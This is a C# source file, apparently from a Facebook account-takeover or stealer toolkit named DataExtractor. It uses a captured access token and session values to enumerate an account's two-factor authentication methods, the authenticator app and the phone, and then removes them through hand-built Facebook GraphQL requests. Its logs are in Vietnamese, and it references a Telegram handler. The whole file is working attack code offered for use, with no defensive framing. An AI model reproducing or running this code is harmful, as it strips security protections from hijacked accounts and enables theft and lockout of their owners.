using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;

namespace DataExtractor.Core.Handlers.Fb;

public class Remove2FaHandler
{
	private abstract class FaMethod
	{
		public abstract bool Remove(FbData fbData, TelegramHandler telegramHandler, HttpClient httpClient);
	}

	private class AppFaMethod : FaMethod
	{
		private string token;

		public AppFaMethod(string token)
		{
			this.token = token;
		}

		public override bool Remove(FbData fbData, TelegramHandler telegramHandler, HttpClient httpClient)
		{
			if (RequestRemove2FaApp(fbData, telegramHandler, httpClient) && AcceptRemove2FaApp(fbData, telegramHandler, httpClient))
			{
				return true;
			}
			return false;
		}

		private bool AcceptRemove2FaApp(FbData fbData, TelegramHandler telegramHandler, HttpClient httpClient)
		{
			string formData = "doc_id=4815760861769860&method=post&locale=vi_VN&pretty=false&format=json&variables=%7B%22scale%22%3A%222%22%2C%22params%22%3A%7B%22payload%22%3A%22%2Fsecurity%2F2fac%2Fsetup%2Fnt%2Fremove_method%2Fasync%2F%3Fcontent_id%3D%255B%25223uxvfv%253A1%2522%252Cnull%255D%26submit_button_id%3D%255B%25223uxvfv%253A4%2522%252Cnull%255D%26progress_id%3D%255B%25223uxvfv%253A5%2522%252Cnull%255D%26auth_method%3Dauthenticator%26start_screen_id%3D%255B%25223uv5ug%253A0%2522%252Cnull%255D%22%2C%22nt_context%22%3A%7B%22styles_id%22%3A%22389b33e40978bfe33a3bf730554a052a%22%2C%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22bloks_version%22%3A%220788ff5e5e6019ac190db2fac9ef75f8d2eb345a616007d97fb3fa9c08f0d608%22%7D%7D%2C%22nt_context%22%3A%7B%22styles_id%22%3A%22389b33e40978bfe33a3bf730554a052a%22%2C%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22bloks_version%22%3A%220788ff5e5e6019ac190db2fac9ef75f8d2eb345a616007d97fb3fa9c08f0d608%22%7D%2C%22profile_image_size%22%3A188%2C%22include_image_ranges%22%3Atrue%7D&fb_api_req_friendly_name=NativeTemplateAsyncQuery&fb_api_caller_class=graphservice&fb_api_analytics_tags=%5B%22GraphServices%22%5D&server_timestamps=true";
			string url = "https://graph.facebook.com/graphql";
			string text = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string> { 
			{
				"Authorization",
				"OAuth " + token
			} });
			fbData.Log("result accept remove 2fa app :\n " + text);
			if (text.Contains("error"))
			{
				return false;
			}
			return true;
		}

		private bool RequestRemove2FaApp(FbData fbData, TelegramHandler telegramHandler, HttpClient httpClient)
		{
			string formData = "doc_id=4357763860983260&method=post&locale=vi_VN&pretty=false&format=json&purpose=fetch&variables=%7B%22params%22%3A%7B%22path%22%3A%22%2Fsecurity%2F2fac%2Fnt%2Fsetup%2Fmethod%2Fremove%2F%22%2C%22nt_context%22%3A%7B%22styles_id%22%3A%22389b33e40978bfe33a3bf730554a052a%22%2C%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22bloks_version%22%3A%220788ff5e5e6019ac190db2fac9ef75f8d2eb345a616007d97fb3fa9c08f0d608%22%7D%2C%22params%22%3A%22%7B%5C%22start_screen_id%5C%22%3A%5C%22%5B%5C%5C%5C%223uv5ug%3A0%5C%5C%5C%22%2Cnull%5D%5C%22%2C%5C%22auth_method%5C%22%3A%5C%22authenticator%5C%22%7D%22%2C%22extra_client_data%22%3A%7B%7D%7D%2C%22scale%22%3A%222%22%2C%22nt_context%22%3A%7B%22styles_id%22%3A%22389b33e40978bfe33a3bf730554a052a%22%2C%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22bloks_version%22%3A%220788ff5e5e6019ac190db2fac9ef75f8d2eb345a616007d97fb3fa9c08f0d608%22%7D%7D&fb_api_req_friendly_name=NativeTemplateScreenQuery&fb_api_caller_class=graphservice&fb_api_analytics_tags=%5B%22GraphServices%22%5D&server_timestamps=true";
			string url = "https://graph.facebook.com/graphql";
			string text = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string> { 
			{
				"Authorization",
				"OAuth " + token
			} });
			fbData.Log("result request remove 2fa app :\n " + text);
			if (text.Contains("error"))
			{
				return false;
			}
			return true;
		}
	}

	private class PhoneFaMethod : FaMethod
	{
		private readonly string _id;

		private string token;

		public PhoneFaMethod(string id, string token)
		{
			this.token = token;
			_id = id;
		}

		public override bool Remove(FbData fbData, TelegramHandler telegramHandler, HttpClient httpClient)
		{
			if (RequestRemovePhone(fbData, telegramHandler, httpClient) && AcceptRemovePhone(fbData, telegramHandler, httpClient))
			{
				return true;
			}
			return false;
		}

		private bool AcceptRemovePhone(FbData fbData, TelegramHandler telegramHandler, HttpClient httpClient)
		{
			string formData = "client_doc_id=307495399215680744133724670301&method=post&locale=vi_VN&pretty=false&format=json&variables=%7B%22scale%22%3A%222%22%2C%22params%22%3A%7B%22payload%22%3A%22%2Fsecurity%2F2fac%2Fsetup%2Fnt%2Fremove_method%2Fasync%2F%3Fcontent_id%3D%255B%25225gx39f%253A1%2522%252Cnull%255D%26submit_button_id%3D%255B%25225gx39f%253A4%2522%252Cnull%255D%26progress_id%3D%255B%25225gx39f%253A5%2522%252Cnull%255D%26method_id%3D" + _id + "%26start_screen_id%3D%255B%25225gtyfn%253A0%2522%252Cnull%255D%22%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22styles_id%22%3A%22d6ef1276d7b13fe964fcd688d46e841b%22%2C%22bloks_version%22%3A%2266c50a9dd0f2f10174d62d79bde3b9eb25e4896f1fd2ff83daf77ec4348534f2%22%7D%7D%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22styles_id%22%3A%22d6ef1276d7b13fe964fcd688d46e841b%22%2C%22bloks_version%22%3A%2266c50a9dd0f2f10174d62d79bde3b9eb25e4896f1fd2ff83daf77ec4348534f2%22%7D%2C%22profile_image_size%22%3A188%2C%22include_image_ranges%22%3Atrue%7D&fb_api_req_friendly_name=NativeTemplateAsyncQuery&fb_api_caller_class=graphservice&fb_api_analytics_tags=%5B%22GraphServices%22%5D&server_timestamps=true";
			string url = "https://graph.facebook.com/graphql";
			string text = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string> { 
			{
				"Authorization",
				"OAuth " + token
			} });
			fbData.Log("result  aceept remove 2fa phone :\n " + text);
			if (text.Contains("error"))
			{
				return false;
			}
			return true;
		}

		private bool RequestRemovePhone(FbData fbData, TelegramHandler telegramHandler, HttpClient httpClient)
		{
			string formData = "client_doc_id=22108083525972740112017213786&method=post&locale=vi_VN&pretty=false&format=json&purpose=fetch&variables=%7B%22params%22%3A%7B%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22styles_id%22%3A%22d6ef1276d7b13fe964fcd688d46e841b%22%2C%22bloks_version%22%3A%2266c50a9dd0f2f10174d62d79bde3b9eb25e4896f1fd2ff83daf77ec4348534f2%22%7D%2C%22path%22%3A%22%2Fsecurity%2F2fac%2Fnt%2Fsetup%2Fmethod%2Fremove%2F%22%2C%22params%22%3A%22%7B%5C%22start_screen_id%5C%22%3A%5C%22%5B%5C%5C%5C%225gtyfn%3A0%5C%5C%5C%22%2Cnull%5D%5C%22%2C%5C%22method_id%5C%22%3A" + _id + "%7D%22%2C%22extra_client_data%22%3A%7B%7D%7D%2C%22scale%22%3A%222%22%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22styles_id%22%3A%22d6ef1276d7b13fe964fcd688d46e841b%22%2C%22bloks_version%22%3A%2266c50a9dd0f2f10174d62d79bde3b9eb25e4896f1fd2ff83daf77ec4348534f2%22%7D%7D&fb_api_req_friendly_name=NativeTemplateScreenQuery&fb_api_caller_class=graphservice&fb_api_analytics_tags=%5B%22GraphServices%22%5D&server_timestamps=true";
			string url = "https://graph.facebook.com/graphql";
			string text = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string> { 
			{
				"Authorization",
				"OAuth " + token
			} });
			fbData.Log("result request 2fa app :\n " + text);
			if (text.Contains("error"))
			{
				return false;
			}
			return true;
		}
	}

	public void Run(TelegramHandler telegramHandler, FbData fbData, HttpClient httpClient)
	{
		fbData.Log("tien hanh remove 2fa");
		string text = fbData.FbToken.Tokens.FirstOrDefault((string a) => a.StartsWith("EAAG"));
		if (string.IsNullOrEmpty(text))
		{
			fbData.Log("ko co token de chay cai nay");
			return;
		}
		List<FaMethod> all2FaMethod = GetAll2FaMethod(telegramHandler, fbData, httpClient, text);
		if (all2FaMethod == null)
		{
			fbData.Log("loi, co ve 2fa ko bat hoac bi loi");
			return;
		}
		if (all2FaMethod.Count == 0)
		{
			fbData.No2Fa = true;
			fbData.Log("2fa co bat, nhung ko co phuong thuc nao ca");
			return;
		}
		foreach (FaMethod item in all2FaMethod)
		{
			item.Remove(fbData, telegramHandler, httpClient);
		}
		all2FaMethod = GetAll2FaMethod(telegramHandler, fbData, httpClient, text);
		if (all2FaMethod == null || all2FaMethod.Count == 0)
		{
			fbData.No2Fa = true;
			fbData.Log("delete thanh cong");
		}
		else
		{
			fbData.Log("delete that bai");
		}
	}

	private List<FaMethod> GetAll2FaMethod(TelegramHandler telegramHandler, FbData fbData, HttpClient httpClient, string token)
	{
		List<FaMethod> list = new List<FaMethod>();
		fbData.Log("get tat ca phuong thuc 2fa hien tai dang co");
		string formData = "av=" + fbData.UserId + "&__user=" + fbData.UserId + "&fb_dtsg=" + WebUtility.UrlEncode(fbData.Fbdtsg) + "&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=LiveProducerProviderPlatformizationNoBroadcastStatusRefetchQuery&variables=%7B%22params%22%3A%7B%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22styles_id%22%3A%22d6ef1276d7b13fe964fcd688d46e841b%22%2C%22bloks_version%22%3A%2266c50a9dd0f2f10174d62d79bde3b9eb25e4896f1fd2ff83daf77ec4348534f2%22%7D%2C%22path%22%3A%22%2Fsecurity%2F2fac_screen%2Fnt%2Fsetup%2Fsecured_action%2F%22%2C%22params%22%3A%22%7B%7D%22%2C%22extra_client_data%22%3A%7B%7D%7D%2C%22scale%22%3A%222%22%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22styles_id%22%3A%22d6ef1276d7b13fe964fcd688d46e841b%22%2C%22bloks_version%22%3A%2266c50a9dd0f2f10174d62d79bde3b9eb25e4896f1fd2ff83daf77ec4348534f2%22%7D%7D&server_timestamps=true&doc_id=3186065241458684";
		string url = "https://www.facebook.com/api/graphql/";
		string text = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		fbData.Log("result : " + text);
		if (!text.Contains("security/2fac/nt/setup/turn_off/"))
		{
			if (text.Contains("security/2fac/nt/setup/qr_code"))
			{
				fbData.Log("chua co 2fa nao ca");
				return new List<FaMethod>();
			}
			fbData.Log("Loi");
			return null;
		}
		if (text.Contains("authenticator"))
		{
			fbData.Log("co 2fa app");
			list.Add(new AppFaMethod(token));
		}
		if (text.Contains("method_id"))
		{
			fbData.Log("co 2fa phone");
			string id = text.CutString("method_id\\\":", "}");
			list.Add(new PhoneFaMethod(id, token));
		}
		return list;
	}
}
